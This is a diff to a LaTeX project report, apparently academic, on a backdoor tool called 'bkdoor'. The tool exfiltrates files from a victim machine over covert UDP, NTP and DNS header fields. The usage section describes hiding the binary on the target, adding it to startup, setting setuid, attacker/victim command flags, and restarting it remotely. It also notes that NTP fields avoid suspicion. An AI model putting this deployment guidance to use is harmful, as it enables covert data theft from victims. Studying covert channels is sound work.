@@ -25,18 +25,30 @@ We did have to reduce the scope of our program somewhat as noted in the Covert C
 
 \section{Usage Instructions}
 
-Installation is not required, the functionality of the program is controlled by command-line switches, simply copy the binary to a surreptitious location on the target machine and either launch it manually or add it to a startup script.
+Installation is not required, the functionality of the program is controlled by command-line switches, simply copy the binary to a surreptitious location on the target machine and either launch it manually or add it to a startup script.\\
+\\
+To compile the program from source, the libpcap and openssl development libraries will be required.  Building the program from source should be possible with any version of GCC that supports at least the gnu99 C standard using the provided makefile.  Note, the makefile will also set the setuid bit on the resulting executable as the program requires elevated privileges to open raw sockets.\\
 
-To compile the program from source, the libpcap and openssl development libraries will be required.  Building the program from source should be possible with any version of GCC that supports at least the gnu99 C standard using the provided makefile.  Note, the makefile will also set the setuid bit on the resulting executable as the program requires elevated priveleges to open raw sockets.
+\clearpage
 
-The available command-line flags are:
--c : Use this option to activate Client mode. This should be used on the attacker's machine.
--s : Use this option to activate Server mode. This should be used on the victim machine.
--h : Use this option to see a short version of the program usage instructions.
--i <arg> : Use this option to specify the remote host that the machine will be communicating with. For the Client, this will be the server's IP. For the Server, this will be the Client's IP.
--w <arg> : Use this option to specify the folder to watch for exfiltration. Any files created or modified in this folder will be sent to the client.
--x <arg> : Use this option to specify the covert channel to use. 'u' for UDP source port, 'n' for NTP ref\_id, 'd' for DNS transaction id.
-
+\subsection{Flags}
+The available command-line flags are:\\
+\\
+\begin{tabularx}{\textwidth}{lX}
+-c & Use this option to activate Client mode. This should be used on the attacker's machine.\\
+\\
+-s & Use this option to activate Server mode. This should be used on the victim machine.\\
+\\
+-h & Use this option to see a short version of the program usage instructions.\\
+\\
+-i \textless arg\textgreater & Use this option to specify the remote host that the machine will be communicating with. For the Client, this will be the server's IP. For the Server, this will be the Client's IP.\\
+\\
+-w \textless arg\textgreater & Use this option to specify the folder to watch for exfiltration. Any files created or modified in this folder will be sent to the client.\\
+\\
+-x \textless arg\textgreater & Use this option to specify the covert channel to use. 'u' for UDP source port, 'n' for NTP ref\_id, 'd' for DNS transaction id.\\
+\end{tabularx}
+\\
+\\
 If you wish to change the watch folder, the easiest way to do this remotely is to use the ps utility to find your covert process on the victim machine and then execute 'kill <process id>; ./bkdoor -s -w <path> -i <ip> ... other options'.
 
 \clearpage
@@ -122,8 +134,9 @@ in the arguments and monitored using Wireshark.
 \end{figure}
 
 The signature and data for the NTP channel is slipped into the Reference Clock ID in the NTP header.
-This would be the first two bytes of the ID field.  This test was performed using the NTP switch
-in the arguments and monitored using Wireshark.
+This would be the first two bytes of the field.  The reference clock IDs are not likely to be
+suspected of holding data and can be hard to tell due to encryption.
+This test was performed using the NTP switch in the arguments and monitored using Wireshark.
 
 \subsection{Test \# 4 - DNS Channel}
 
